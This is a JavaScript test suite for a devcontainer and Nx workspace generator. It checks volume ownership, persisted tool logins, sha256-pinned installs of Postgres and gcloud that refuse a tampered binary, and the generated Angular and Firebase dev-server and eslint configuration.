// first rebuild died in `yarn install` with EACCES. So these RUN the composed script's opening sections (up to
// the first install step) with `stat` reporting root and `sudo` recording, and assert what it would reclaim.
const reclaimed = (post, { owner = 'root' } = {}) => {
  const cut = post.indexOf('\n# --- The OS packages');
  const opening = post.slice(0, cut === -1 ? undefined : cut);
  const dir = mkdtempSync(join(tmpdir(), 'reclaim-'));
  const [ws, home, bin] = ['ws', 'home', 'bin'].map((name) => join(dir, name));
  for (const path of ['.nx/cache', '.nx/workspace-data', 'node_modules', '.angular']) mkdirSync(join(ws, path), { recursive: true });
  for (const path of ['.cache/ms-playwright', '.config', '.local']) mkdirSync(join(home, path), { recursive: true });
  mkdirSync(bin);
  const log = join(dir, 'sudo.log');
  writeFileSync(join(bin, 'stat'), `#!/bin/sh\ncase "$2" in %U) echo ${owner} ;; %a) echo 755 ;; esac\n`, { mode: 0o755 });
  writeFileSync(join(bin, 'sudo'), `#!/bin/sh\necho "$*" >> '${log}'\n`, { mode: 0o755 });
  execFileSync('bash', ['-c', opening], { cwd: ws, env: { PATH: `${bin}:${process.env.PATH}`, HOME: home }, encoding: 'utf8' });
  const me = execFileSync('id', ['-un'], { encoding: 'utf8' }).trim();
  const group = execFileSync('id', ['-gn'], { encoding: 'utf8' }).trim();
  const calls = existsSync(log)
    ? readFileSync(log, 'utf8').trim().split('\n').map((line) => line.split(ws).join('$WS').split(home).join('$HOME').split(`${me}:${group}`).join('ME'))
    : [];
  rmSync(dir, { recursive: true, force: true });
  return { calls, opening };
};
const shParses = (script) => {
  try {
    execFileSync('sh', ['-n'], { input: script });
    return true;
  } catch {
    return false;
  }
};
const expectCalls = (ok, label, calls, expected) =>
  ok(JSON.stringify(calls) === JSON.stringify(expected), `${label}: reclaimed\n           ${calls.join('\n           ')}\n         expected\n           ${expected.join('\n           ')}`);

checkAsync('volume ownership: a node-hosted repo reclaims node_modules (and the Nx volumes) before the install', async (ok) => {
  const tree = createTreeWithEmptyWorkspace();
  tree.write('package-lock.json', '{}');
  const a = await artifacts(tree, ['nx', 'agent', 'node']);
  expectCalls(ok, 'node', reclaimed(a.post).calls, [
    'chown ME $WS/.nx',
    'chown -R ME $WS/.nx/cache',
    'chown -R ME $WS/.nx/workspace-data',
    'chown -R ME $HOME/.config',
    'chown -R ME $HOME/.local',
    'chown -R ME $HOME/.cache',
    'chown -R ME $WS/node_modules',
  ]);
  ok(a.post.indexOf('reclaim_volume tree "$WS/node_modules"') < a.post.indexOf('$PM_INSTALL'), 'node_modules is reclaimed AFTER the install');
  ok(bashParses(a.post) && shParses(a.post), 'node post-create does not parse under bash -n and sh -n');
});

checkAsync('volume ownership: web reclaims ~/.cache (one volume, the Playwright browsers inside it) and opens the shared port registry (1777)', async (ok) => {
  const a = await artifacts(wrapperRepo(), ['nx', 'agent', 'web']);
  const { calls, opening } = reclaimed(a.post);
  expectCalls(ok, 'web', calls, [
    'chown ME $WS/.nx',
    'chown -R ME $WS/.nx/cache',
    'chown -R ME $WS/.nx/workspace-data',
    'chown -R ME $HOME/.config',
    'chown -R ME $HOME/.local',
    'chown -R ME $HOME/.cache',
  ]);
  ok(opening.includes('share_volume "/var/opt/bespunky/ports"') && /share_volume\(\) \{[\s\S]*sudo chmod 1777 "\$1"/.test(opening), 'the port registry is not prepared with chmod 1777');
  ok(!/reclaim_volume \w+ "\/var\/opt/.test(opening), 'the SHARED registry is chowned to one container\'s user');
  ok(bashParses(a.post) && shParses(a.post), 'web post-create does not parse under bash -n and sh -n');
});

// Logins survive a rebuild: Claude Code's account record moves INSIDE the persisted config dir, the gh login gets a
// volume, and git is re-wired to it on every create. The account piece is RUN, against a fake config dir: it restores
// the newest of Claude Code's own backups when the record is missing — and never touches a record that exists.
checkAsync('logins persist: CLAUDE_CONFIG_DIR, ONE ~/.config volume, git wiring — and the account record is restored, never clobbered', async (ok) => {
  const a = await artifacts(wrapperRepo(), ['nx', 'agent']);
  const home = a.dc.remoteUser ? `/home/${a.dc.remoteUser}` : '/home/vscode';
  ok(a.dc.containerEnv.CLAUDE_CONFIG_DIR === `${home}/.claude`, `CLAUDE_CONFIG_DIR is ${a.dc.containerEnv.CLAUDE_CONFIG_DIR}`);
  ok(a.dc.mounts.some((m) => m.includes(`target=${home}/.claude,`) && m.includes('type=bind')), 'the config dir is the persisted bind');
  ok(a.dc.mounts.filter((m) => m.includes(`target=${home}/.config`)).length === 1, 'not exactly ONE mount for ~/.config (one per tool crept back?)');
  ok(a.dc.mounts.some((m) => m.includes(`target=${home}/.config,type=volume`)), '~/.config is not a persisted volume');
  ok(a.dc.mounts.some((m) => m.includes(`target=${home}/.cache,type=volume`)) && !a.dc.mounts.some((m) => m.includes('/.cache/')), '~/.cache is not ONE persisted volume (or a per-tool cache volume crept back)');
  // A package manager the image lacks and the global prefix refuses lands in ~/.local (house.package-manager.sh): the volume
  // keeps it across a rebuild, first on PATH. What the package managers themselves keep was looked at with the real ones:
  // yarn 1 and pnpm's caches and stores stay inside the XDG homes (~/.cache, ~/.local), except pnpm's store for a project
  // on the repo's mount, which stays on that mount to hard-link (a cache: ignored by the floor, see layers/nx.ts); yarn 2+'s ~/.yarn/berry is a
  // download cache, left where it is, since YARN_GLOBAL_FOLDER would also move yarn 1's `yarn global` out of ~/.config.
  // NOT persisted, and known: a registry login in ~/.npmrc (npm, pnpm: true of every node-layer container before this)
  // and ~/.yarnrc.yml (yarn 2+). A rebuild loses it; see the effort's DECISION.md.
  ok(a.dc.mounts.some((m) => m.includes(`target=${home}/.local,type=volume`)), '~/.local is not a persisted volume');
  ok(a.dc.remoteEnv.PATH.startsWith(`${home}/.local/bin:`), `~/.local/bin is not first on PATH: ${a.dc.remoteEnv.PATH}`);
  ok(a.post.includes('gh auth setup-git'), 'git is not wired to the gh login');
  const start = a.post.indexOf("# --- Claude Code's account record");
  const piece = a.post.slice(start, a.post.indexOf('\n# --- ', start + 1));
  ok(start !== -1 && a.post.indexOf('# --- Claude Code, installed') > start, 'the account piece runs before Claude Code is installed or run');
  const dir = mkdtempSync(join(tmpdir(), 'claude-account-'));
  const config = join(dir, '.claude');
  mkdirSync(join(config, 'backups'), { recursive: true });
  writeFileSync(join(config, 'backups/.claude.json.backup.1'), 'old');
  writeFileSync(join(config, 'backups/.claude.json.backup.2'), 'newest');
  execFileSync('touch', ['-d', '2000-01-01', join(config, 'backups/.claude.json.backup.1')]);
  const run = () => execFileSync('bash', ['-c', `set -euo pipefail\n${piece}`], { env: { PATH: process.env.PATH, HOME: dir }, encoding: 'utf8' });
  run();
  ok(readFileSync(join(config, '.claude.json'), 'utf8') === 'newest', 'a missing account record is not restored from the NEWEST backup');
  writeFileSync(join(config, '.claude.json'), 'live');
  run();
  ok(readFileSync(join(config, '.claude.json'), 'utf8') === 'live', 'an existing account record was overwritten');
  rmSync(join(config, '.claude.json'));
  rmSync(join(config, 'backups'), { recursive: true });
  run();
  ok(!existsSync(join(config, '.claude.json')), 'with no backups, nothing is invented');
  rmSync(dir, { recursive: true, force: true });
});

// Postgres. The server and dbmate are in the IMAGE (a closure and a bare binary, both sha-pinned, neither under a mount), and
// what must outlive a rebuild is under the persisted ~/.local: the clusters, through the launcher's data home, and psql's
// history, which would otherwise land in $HOME. No mount of its own. And no database URL in anything committed.
checkAsync('postgres: in the image by exact pin, on the wrapper host too; its state lives in the persisted ~/.local; no URL in the devcontainer', async (ok) => {
  const { DBMATE_DOWNLOADS, DBMATE_VERSION } = require_(join(BUILD, 'src/generators/_utils/versions'));
  const { POSTGRES_CLOSURES } = require_(join(BUILD, 'src/generators/_utils/postgres-closures'));
  const tree = wrapperRepo();
  const a = await artifacts(tree, ['nx', 'agent', 'postgres']);
  const home = `/home/${a.dc.remoteUser ?? 'vscode'}`;
  for (const [arch, { url, sha256 }] of Object.entries(DBMATE_DOWNLOADS)) ok(a.osScript.includes(`dbmate ${DBMATE_VERSION} ${arch} ${sha256} ${url} bin`), `the installer lacks dbmate's ${arch} line`);
  ok(a.osScript.includes(POSTGRES_CLOSURES['18'].trixie.version), 'the installer lacks the default major\'s closure');
  // It trusts every connection on loopback, so a forward hands the host's loopback a superuser. A stack's port moves with its offset.
  ok(a.dc.portsAttributes?.['5432']?.onAutoForward === 'ignore', 'the base port is left to auto-forward');
  ok(a.dc.portsAttributes?.['bespunky/postgres/.+/data']?.onAutoForward === 'ignore', 'a shifted stack\'s server is left to auto-forward: its command line is not named');
  ok(shParses(a.osScript), 'the installer does not parse');
  ok(a.dc.containerEnv?.PSQL_HISTORY === `${home}/.local/share/bespunky/postgres/psql_history`, `psql's history would not survive a rebuild: ${a.dc.containerEnv?.PSQL_HISTORY}`);
  ok(a.dc.mounts.some((m) => m.includes(`target=${home}/.local,type=volume`)), '~/.local, the clusters\' home, is not a persisted volume');
  const without = await artifacts(wrapperRepo(), ['nx', 'agent']);
  ok(a.dc.mounts.length === without.dc.mounts.length, 'the layer added a mount: its state belongs in a persisted XDG home');
  ok(!/postgres(ql)?:\/\//.test(a.dcText), 'a database URL in devcontainer.json is inherited by every process, and committed');
  ok(a.house.includes('## Postgres') && a.rules.includes('## Postgres') && a.claude.includes('Postgres'), 'the house docs have no Postgres section');
  ok(a.house.includes('./nx run postgres:start'), 'the docs do not render this host\'s Nx');
  ok(!without.house.includes('## Postgres') && !without.rules.includes('## Postgres'), 'a project without the layer reads about it');
  // A project with no bare-binary tool must keep the installer it has: moving its bytes would rebuild its image for nothing.
  const firebase = createTreeWithEmptyWorkspace();
  writeJson(firebase, 'firebase.json', {});
  const f = await artifacts(firebase, ['nx', 'agent', 'node', 'firebase']);
  ok(!f.osScript.includes('case "$url" in') && f.osScript.includes('tar -xzf "$download/archive.tar.gz"'), 'a tarball-only installer changed shape');
  ok(!f.osScript.includes('{{'), 'a tarball-only installer kept a placeholder');
});

checkAsync('postgres: a bare binary installs for real through the generated installer, unprivileged, and a tampered one is refused', async (ok) => {
  const { compose, renderOsPackagesScript } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
  const { createHash } = await import('node:crypto');
  const dir = mkdtempSync(join(tmpdir(), 'bespunky-binary-archive-'));
  const body = '#!/bin/sh\necho fake-tool-1\n';
  const stubs = join(dir, 'stubs');
  mkdirSync(stubs);
  writeFileSync(join(stubs, 'sudo'), '#!/bin/sh\nexec "$@"\n', { mode: 0o755 });
  writeFileSync(join(stubs, 'apt-get'), '#!/bin/sh\n', { mode: 0o755 });
  writeFileSync(join(stubs, 'dpkg-query'), "#!/bin/sh\nprintf 'install ok installed'\n", { mode: 0o755 });
  // curl refuses nothing here: a stub stands in for the download, since the composer only accepts https.
  writeFileSync(join(stubs, 'curl'), `#!/bin/sh\nwhile [ "$#" -gt 1 ]; do case "$1" in -o) out="$2"; shift ;; esac; shift; done\ncp '${join(dir, 'served')}' "$out"\n`, { mode: 0o755 });
  writeFileSync(join(dir, 'served'), body);
  const sha256 = createHash('sha256').update(body).digest('hex');
  const render = (hash) => renderOsPackagesScript(compose([{ id: 't', fragment: { image: { ref: 'img', remoteUser: 'node' }, archives: [{ format: 'binary', id: 'fake-tool', version: '1.0.0', downloads: { amd64: { url: 'https://example.com/fake-tool-linux-amd64', sha256: hash }, arm64: { url: 'https://example.com/fake-tool-linux-arm64', sha256: hash } } }] } }], { nodeMajor: '22' }));
  const root = join(dir, 'root');
  mkdirSync(root);
  const script = join(dir, 'install.sh');
  writeFileSync(script, render(sha256));
  ok(shParses(readFileSync(script, 'utf8')), 'the rendered installer does not parse');
  execFileSync('sh', [script], { env: { PATH: `${stubs}:${process.env.PATH}`, HOUSE_PACKAGES_ROOT: root }, stdio: 'ignore' });
  const link = join(root, 'usr/local/bin/fake-tool');
  ok(existsSync(link) && execFileSync(link, { encoding: 'utf8' }).trim() === 'fake-tool-1', 'the binary is not on PATH, executable, under its own name');
  ok(readlinkSync(join(root, 'opt/bespunky/fake-tool/current')) === '1.0.0', '`current` does not name the pin');
  const tampered = join(dir, 'root2');
  mkdirSync(tampered);
  writeFileSync(script, render('0'.repeat(64)));
  let failed = false;
  try {
    execFileSync('sh', [script], { env: { PATH: `${stubs}:${process.env.PATH}`, HOUSE_PACKAGES_ROOT: tampered }, stdio: 'ignore' });
  } catch {
    failed = true;
  }
  ok(failed && !existsSync(join(tampered, 'usr/local/bin/fake-tool')), 'a binary that does not match its sha256 was installed');
  rmSync(dir, { recursive: true, force: true });
});

// The Firebase CLI is the PROJECT's pinned devDependency (0.50.0), not an image feature: no second `firebase` on PATH,
// and nothing new to persist — firebase-tools keeps its login in ~/.config/configstore (configstore's XDG home) and its
// emulator downloads in ~/.cache/firebase, both inside the agent layer's persisted volumes asserted above. gcloud keeps
// its logins and application-default credentials in ~/.config/gcloud (googlecloudsdk/core/config.py) — persisted too.
checkAsync('firebase: the CLI comes from node_modules/.bin, gcloud is a pinned archive in the image — no unpinned features; their state lives in the persisted XDG homes', async (ok) => {
  const tree = createTreeWithEmptyWorkspace();
  writeJson(tree, 'firebase.json', {});
  const a = await artifacts(tree, ['nx', 'agent', 'node', 'firebase']);
  const features = Object.keys(a.dc.features ?? {});
  ok(!features.some((id) => id.includes('firebase-cli')), `the image still installs a Firebase CLI of its own: ${features}`);
  // gcloud: Google's VERSIONED archive of the pin, per architecture with its projected sha256 — never the unpinned
  // feature, never Google's apt repository (a rolling index: the pin would expire and fail every cache-miss build).
  const { GCLOUD_CLI_VERSION } = require_(join(BUILD, 'src/generators/_utils/versions'));
  const { GCLOUD_CLI_ARCHIVE } = require_(join(BUILD, 'src/generators/_utils/gcloud-archive'));
  ok(!features.some((id) => id.includes('gcloud')), `gcloud still comes from a feature: ${features}`);
  ok(GCLOUD_CLI_ARCHIVE.version === GCLOUD_CLI_VERSION, `gcloud-archive.ts is for ${GCLOUD_CLI_ARCHIVE.version}, the pin is ${GCLOUD_CLI_VERSION} (node tools/firebase-compat/project.mjs --write)`);
  for (const [arch, { url, sha256 }] of Object.entries(GCLOUD_CLI_ARCHIVE.downloads)) {
    ok(a.osScript.includes(`google-cloud-cli ${GCLOUD_CLI_VERSION} ${arch} ${sha256} ${url} google-cloud-sdk/bin`), `the installer lacks gcloud's ${arch} archive line`);
  }
  ok(!/packages\.cloud\.google\.com|google-cloud-cli=|apt-key|signed-by/.test(a.osScript), 'gcloud still comes (partly) from Google\'s apt repository');
  ok(/^curl ca-certificates$|(^| )ca-certificates( |$)/m.test(a.osScript) && /install_archive "\$id"/.test(a.osScript) && /archive tools to install/.test(a.osScript) && !a.osScript.includes('{{') && shParses(a.osScript), 'with an archive tool, its fetch tools and installer are rendered (markers gone) and the script parses');
  ok(a.dc.containerEnv?.CLOUDSDK_COMPONENT_MANAGER_DISABLE_UPDATE_CHECK === 'true', 'the pinned gcloud would nag to `gcloud components update` (moving the pin)');
  ok((a.dc.remoteEnv?.PATH ?? '').includes('${containerWorkspaceFolder}/node_modules/.bin'), 'node_modules/.bin is not on PATH — the pinned `firebase` would not resolve');
  const home = `/home/${a.dc.remoteUser ?? 'node'}`;
  ok(a.dc.mounts.some((m) => m.includes(`target=${home}/.config,type=volume`)), 'firebase login (~/.config/configstore) would not survive a rebuild');
  ok(a.dc.mounts.some((m) => m.includes(`target=${home}/.cache,type=volume`)), 'the emulator downloads (~/.cache/firebase) would not survive a rebuild');
});

// Version truth: the derived table must have been projected from the CLI the house pins, and the seed Node must be one
// Cloud Functions runs (offline; tools/firebase-compat/project.mjs re-asks npm in CI).
check('versions: the Firebase table was projected from the pinned firebase-tools, and the house Node seed is a live Functions runtime', (ok) => {
  const { FIREBASE_TOOLS_VERSION, HOUSE_NODE_MAJOR } = require_(join(BUILD, 'src/generators/_utils/versions'));
  const { FUNCTIONS_RUNTIMES_FROM_FIREBASE_TOOLS, FUNCTIONS_NODE_RUNTIMES } = require_(join(BUILD, 'src/generators/_utils/firebase-compat'));
  ok(FUNCTIONS_RUNTIMES_FROM_FIREBASE_TOOLS === FIREBASE_TOOLS_VERSION, `projected from firebase-tools@${FUNCTIONS_RUNTIMES_FROM_FIREBASE_TOOLS}, the pin is ${FIREBASE_TOOLS_VERSION} — run: node tools/firebase-compat/project.mjs --write`);
  ok(FUNCTIONS_NODE_RUNTIMES.includes(HOUSE_NODE_MAJOR), `HOUSE_NODE_MAJOR ${HOUSE_NODE_MAJOR} is not a GA Cloud Functions runtime (${FUNCTIONS_NODE_RUNTIMES})`);
  const { TYPESCRIPT_NODE_IMAGE_MAJORS } = require_(join(BUILD, 'src/generators/_utils/node-facts'));
  ok(TYPESCRIPT_NODE_IMAGE_MAJORS.includes(Number(HOUSE_NODE_MAJOR)), `HOUSE_NODE_MAJOR ${HOUSE_NODE_MAJOR} has no typescript-node image (${TYPESCRIPT_NODE_IMAGE_MAJORS}) — a new project's container could not be built`);
});

checkAsync('volume ownership: a wrapper-hosted repo (no node) reclaims only the Nx volumes, ~/.config, ~/.local and ~/.cache; a rebuild reclaims nothing', async (ok) => {
  const a = await artifacts(wrapperRepo(), ['nx', 'agent']);
  expectCalls(ok, 'wrapper', reclaimed(a.post).calls, [
    'chown ME $WS/.nx',
    'chown -R ME $WS/.nx/cache',
    'chown -R ME $WS/.nx/workspace-data',
    'chown -R ME $HOME/.config',
    'chown -R ME $HOME/.local',
    'chown -R ME $HOME/.cache',
  ]);
  const me = execFileSync('id', ['-un'], { encoding: 'utf8' }).trim();
  expectCalls(ok, 'already owned (a rebuild)', reclaimed(a.post, { owner: me }).calls, []);
  ok(bashParses(a.post) && shParses(a.post), 'wrapper post-create does not parse under bash -n and sh -n');
});

checkAsync('volume ownership: EVERY volume a layer declares is reclaimed — the full house shape, .angular included', async (ok) => {
  const tree = FIXTURES['angular web app with firebase and a design system']();
  tree.write('yarn.lock', '');
  const a = await artifacts(tree, registry.detectLayers(tree));
  const volumes = a.dc.mounts.filter((m) => m.includes('type=volume')).map((m) => /target=([^,]+)/.exec(m)[1]);
  const { calls, opening } = reclaimed(a.post);
  for (const target of volumes) {
    const path = target.replace('${containerWorkspaceFolder}', '$WS').replace('/home/node', '$HOME');
    ok(calls.includes(`chown -R ME ${path}`) || opening.includes(`share_volume "${path}"`), `volume ${target} has no reclaim`);
  }
  ok(bashParses(a.post) && shParses(a.post), 'full post-create does not parse under bash -n and sh -n');
});

check('volume ownership: a volume outside the workspace and home must DECLARE its policy', (ok) => {
  const { compose } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
  const base = { id: 'agent', fragment: { image: { ref: 'img', remoteUser: 'node' } } };
  const stray = (ownership) => ({ id: 'x', fragment: { mounts: [{ mount: 'source=v,target=/opt/thing,type=volume', ...(ownership ? { ownership } : {}) }] } });
  let threw = false;
  try {
    compose([base, stray()], { nodeMajor: '22' });
  } catch (error) {
    threw = /declare its `ownership`/.test(error.message);
  }
  ok(threw, 'an undeclared policy outside the workspace/home was guessed');
  const declared = compose([base, stray('shared')], { nodeMajor: '22' });
  ok(JSON.stringify(declared.volumes) === JSON.stringify([{ root: null, path: '/opt/thing', ownership: 'shared' }]), `declared: ${JSON.stringify(declared.volumes)}`);
});

// ── the dev-loop seams between units: stack adapters, the composer mirror, the TUI, the platform firewall ────
const ts_ = require_('typescript');
const angularShop = () => {
  const tree = createTreeWithEmptyWorkspace();
  // What an Angular house workspace declares: Nx exactly (house.sh pins it), Angular (which @angular/fire follows).
  writeJson(tree, 'package.json', { name: 'shop', dependencies: { '@angular/core': '~20.3.0' }, devDependencies: { '@nx/angular': '23.1.0', nx: '23.1.0' } });
  addProjectConfiguration(tree, 'shop', {
    root: 'apps/shop',
    projectType: 'application',
    targets: {
      build: { executor: '@angular/build:application' },
      // where a fresh @nx/angular:application parks its dev-server
      serve: { executor: '@angular/build:dev-server', options: { port: 4300 } },
    },
  });
  return tree;
};
const targetsOf = (tree, name) => JSON.parse(tree.read(`apps/${name}/project.json`, 'utf8')).targets;

checkAsync('serve: the Angular leaf comes from the adapter; the composer mirrors it; the TUI is turned off', async (ok) => {
  const tree = angularShop();
  await generator('serve')(tree, { project: 'shop' });
  const t = targetsOf(tree, 'shop');
  ok(t['dev-server'].executor === '@angular/build:dev-server' && t['dev-server'].options.host === '0.0.0.0', `leaf: ${JSON.stringify(t['dev-server'])}`);
  ok(t['dev-server'].options.port === 4300, 'a user-tuned leaf option survives');
  ok(t['dev-stack'].executor === '@bespunky/nx-tools:serve' && t['dev-stack'].continuous === true, 'the continuous composer on `dev-stack`');
  ok(t.serve.executor === '@bespunky/nx-tools:serve' && t.serve.continuous === false, '`serve` is the engine, explicitly not continuous — its own stack, its own exit status');
  ok(t['dev-server'].continuous === false, 'the leaf is explicitly not continuous');
  ok(JSON.stringify(t['dev-stack'].options) === JSON.stringify(t['dev-server'].options), 'composer options mirror the leaf');
  ok(JSON.stringify(t['dev-stack'].configurations) === JSON.stringify(t['dev-server'].configurations), 'composer configurations mirror the leaf');
  ok(JSON.stringify(t.serve.options) === JSON.stringify(t['dev-server'].options) && JSON.stringify(t.serve.configurations) === JSON.stringify(t['dev-server'].configurations), '`serve` mirrors the leaf too');
  ok(JSON.parse(tree.read('nx.json', 'utf8')).tui?.enabled === false, 'nx.json tui.enabled=false');
});

checkAsync('serve: a workspace that chose its TUI keeps the choice', async (ok) => {
  const tree = angularShop();
  const nxJson = JSON.parse(tree.read('nx.json', 'utf8'));
  writeJson(tree, 'nx.json', { ...nxJson, tui: { enabled: true } });
  await generator('serve')(tree, { project: 'shop' });
  ok(JSON.parse(tree.read('nx.json', 'utf8')).tui.enabled === true, 'tui.enabled was overridden');
});

checkAsync('serve: a project no stack builds, with no dev-server, is told what is missing (no Angular leaf invented)', async (ok) => {
  const tree = createTreeWithEmptyWorkspace();
  addProjectConfiguration(tree, 'api', { root: 'apps/api', projectType: 'application', targets: { build: { executor: 'nx:run-commands' } } });
  let message = '';
  try {
    await generator('serve')(tree, { project: 'api' });
  } catch (error) {
    message = error.message;
  }
  ok(/nothing to serve/.test(message) && /no registered stack builds it/.test(message), `got: ${message || '(no error)'}`);
});

checkAsync('serve: an existing non-Angular dev-server is composed as-is', async (ok) => {
  const tree = createTreeWithEmptyWorkspace();
  addProjectConfiguration(tree, 'site', { root: 'apps/site', projectType: 'application', targets: { 'dev-server': { executor: '@nx/vite:dev-server', options: { port: 5173 } } } });
  await generator('serve')(tree, { project: 'site' });
  const t = targetsOf(tree, 'site');
  ok(t['dev-server'].executor === '@nx/vite:dev-server' && !('buildTarget' in t['dev-server'].options), `leaf touched: ${JSON.stringify(t['dev-server'])}`);
  ok(t['dev-stack'].options.port === 5173 && !('buildTarget' in t['dev-stack'].options), `composer: ${JSON.stringify(t['dev-stack'])}`);
});

checkAsync('firebase client on a new Angular app: proxy.conf.mjs is the dev-server proxyConfig, on the leaf AND its mirror; idempotent', async (ok) => {
  const tree = angularShop();
  tree.write('apps/shop/src/app/app.config.ts', "import { ApplicationConfig } from '@angular/core';\nexport const appConfig: ApplicationConfig = { providers: [] };\n");
  await generator('serve')(tree, { project: 'shop' });
  const { angular } = require_(join(BUILD, 'src/adapters/angular'));
  angular.firebase.attach(tree, 'shop', { workspaceName: 'shop', staging: false, wireProviders: true });
  const once = tree.read('apps/shop/project.json', 'utf8');
  const t = JSON.parse(once).targets;
  ok(tree.exists('apps/shop/proxy.conf.mjs'), 'proxy.conf.mjs written');
  ok(t['dev-server'].options.proxyConfig === 'apps/shop/proxy.conf.mjs', `leaf: ${JSON.stringify(t['dev-server'].options)}`);
  ok(t['dev-stack'].options.proxyConfig === 'apps/shop/proxy.conf.mjs', 'the composer mirror carries it too');
  // the next sync's order: serve, then the client again — nothing may move
  await generator('serve')(tree, { project: 'shop' });
  angular.firebase.attach(tree, 'shop', { workspaceName: 'shop', staging: false, wireProviders: false });
  ok(tree.read('apps/shop/project.json', 'utf8') === once, 'a re-run changed project.json');
});

checkAsync('firebase client on an app whose dev server has its own proxy config: kept, and told what to add (R4-1)', async (ok) => {
  const tree = angularShop();
  tree.write('apps/shop/src/app/app.config.ts', "import { ApplicationConfig } from '@angular/core';\nexport const appConfig: ApplicationConfig = { providers: [] };\n");
  await generator('serve')(tree, { project: 'shop' });
  const config = JSON.parse(tree.read('apps/shop/project.json', 'utf8'));
  config.targets['dev-server'].options.proxyConfig = 'apps/shop/proxy.api.mjs';
  tree.write('apps/shop/project.json', JSON.stringify(config));
  const { angular } = require_(join(BUILD, 'src/adapters/angular'));
  const { logger } = require_('@nx/devkit');
  const warned = [];
  const warn = logger.warn;
  logger.warn = (message) => warned.push(String(message));
  try {
    angular.firebase.attach(tree, 'shop', { workspaceName: 'shop', staging: false, wireProviders: true });
  } finally {
    logger.warn = warn;
  }
  const t = JSON.parse(tree.read('apps/shop/project.json', 'utf8')).targets;
  ok(t['dev-server'].options.proxyConfig === 'apps/shop/proxy.api.mjs', `the project's choice kept: ${t['dev-server'].options.proxyConfig}`);
  ok(tree.exists('apps/shop/proxy.local.mjs'), 'the proxy.local.mjs seam is seeded');
  ok(warned.some((w) => w.includes('uses a proxy config of its own') && w.includes("import { emulatorRoutes } from './proxy.conf.mjs';")), `warned: ${warned.join(' | ') || '(nothing)'}`);
});

checkAsync('a first scaffold: the Firebase core, arriving after the web seeding, still declares the emulators for served apps', async (ok) => {
  const tree = angularShop();
  await generator('serve')(tree, { project: 'shop' });
  const before = JSON.parse(tree.read('.bespunky/dev.json', 'utf8'));
  ok(!before.apps.shop.processes.some((p) => p.id === 'emulators'), 'no emulators before the suite exists');
  await generator('firebase-emulators')(tree, {});
  const after = JSON.parse(tree.read('.bespunky/dev.json', 'utf8'));
  ok(after.apps.shop.processes.some((p) => p.id === 'emulators'), `emulators not declared: ${JSON.stringify(after.apps.shop.processes.map((p) => p.id))}`);
});

// App Hosting builds and serves a WEB app: a core-only repo (functions + emulators) must not be handed its config.
checkAsync('apphosting.yaml is seeded only with a client app — and then once, never clobbered', async (ok) => {
  const core = createTreeWithEmptyWorkspace();
  writeJson(core, 'package.json', { name: 'api', devDependencies: { nx: '23.2.1' } });
  await generator('firebase-emulators')(core, { staging: true });
  ok(!core.exists('apphosting.yaml') && !core.exists('apphosting.staging.yaml'), 'core-only: App Hosting config seeded with no web app');
  const shop = angularShop();
  await generator('firebase-emulators')(shop, { project: 'shop' });
  ok(shop.exists('apphosting.yaml'), 'client app: apphosting.yaml not seeded');
  shop.write('apphosting.yaml', '# mine\n');
  await generator('firebase-emulators')(shop, {});
  ok(shop.read('apphosting.yaml', 'utf8') === '# mine\n', 'a re-run clobbered the seeded apphosting.yaml');
});

checkAsync('firebase core on an old-shaped eslint.config.mjs (no trailing comma): a well-formed splice, idempotent', async (ok) => {
  const tree = createTreeWithEmptyWorkspace();
  writeJson(tree, 'package.json', { name: 'shop', devDependencies: { nx: '23.2.1' } });
  const eslint = [
    "import nx from '@nx/eslint-plugin';",
    'export default [',
    '    {',
    "        files: ['**/*.ts'],",
    '        rules: {',
    "            '@nx/enforce-module-boundaries': [",
    "                'error',",
    '                {',
    '                    depConstraints: [',
    '                        {',
    '                            sourceTag: "*",',
    '                            onlyDependOnLibsWithTags: [',
    '                                "*"',
    '                            ]',
    '                        }',
    '                    ]',
    '                }',
    '            ]',
    '        }',
    '    }',
    '];',
    '',
  ].join('\n');
  tree.write('eslint.config.mjs', eslint);
  await generator('firebase-emulators')(tree, {});
  const out = tree.read('eslint.config.mjs', 'utf8');
  const sf = ts_.createSourceFile('eslint.config.mjs', out, ts_.ScriptTarget.Latest, true, ts_.ScriptKind.JS);
  ok(sf.parseDiagnostics.length === 0, `does not parse: ${sf.parseDiagnostics.map((d) => d.messageText).join('; ')}`);
  ok(!/^\s*,\s*$/m.test(out) && !/},\]/.test(out), `malformed splice:\n${out}`);
  ok(/\n {4}},\n {4}\/\/ THE PLATFORM FIREWALL/.test(out), `not at the neighbours' indentation:\n${out}`);
  ok(/\n {4}}\n\];\n$/.test(out), `closing bracket not on its own line:\n${out}`);
  ok(/';\n\n\/\/ THE PLATFORM FIREWALL[\s\S]*\n\];\n\n[\s\S]*\nconst moduleBoundaries = [^\n]*\n\nexport default \[\n {4}\/\/ THE PLATFORM FIREWALL/.test(out), `the declarations, set apart above the export; the coverage block first:\n${out}`);
  // ONE rule instance: the project's options hoisted (dedented to the top level, its stock catch-all gone, in its own
  // style), its entry replaced in place.
  ok(/\nconst moduleBoundaryOptions = \{\n {4}depConstraints: \[\]\n\};\n/.test(out), `the project's options, hoisted:\n${out}`);
  ok(/\n {12}'@nx\/enforce-module-boundaries': moduleBoundaries\(platformConstraints\)\n {8}}/.test(out), `the project's entry, in place:\n${out}`);
  await generator('firebase-emulators')(tree, {});
  ok(tree.read('eslint.config.mjs', 'utf8') === out, 'a re-run changed eslint.config.mjs');
});

// A6 — the emulator ports are firebase.json's, the dev-server forward is the client app's stack's: one source each.
checkAsync('firebase devcontainer ports come from firebase.json and the client app\'s stack — no dev-server port without a client app', async (ok) => {
  const backend = FIXTURES['plain npm repo wearing firebase and a neutral design system']();
  const a = await artifacts(backend, [...registry.detectLayers(backend), 'agent']);
  ok(!(a.dc.forwardPorts ?? []).includes(4200), `a backend-only Firebase forwards a dev-server port: ${JSON.stringify(a.dc.forwardPorts)}`);
  ok(JSON.stringify(a.dc.forwardPorts) === '[4000,9099,8080,9150,9199,5001,4500]', `no firebase.json suite yet → the house suite: ${JSON.stringify(a.dc.forwardPorts)}`);
  const custom = FIXTURES['plain npm repo wearing firebase and a neutral design system']();
  writeJson(custom, 'firebase.json', { emulators: { auth: { port: 19099 }, firestore: { port: 18080, websocketPort: 19150 }, ui: { enabled: false }, singleProjectMode: true } });
  const b = await artifacts(custom, [...registry.detectLayers(custom), 'agent']);
  // The forwarded emulator ports serve a PERSON — the Emulator UI's page dials them; the app reaches every emulator
  // through its own origin. So no UI, no emulator forward at all.
